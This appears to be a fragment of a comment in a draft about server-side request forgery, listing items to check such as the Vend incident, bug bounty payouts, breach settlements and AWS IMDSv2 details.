+- Vend incident details and timeline
+- Uber bug bounty reward amount for SSRF findings
+- Google SSRF bug bounty reward amounts
+- Real-world breach monetary impacts and settlements
+- Specific cloud provider metadata endpoint behavior changes
+- Latest AWS IMDSv2 implementation details
+- Cloud provider security best practices updates
+-->
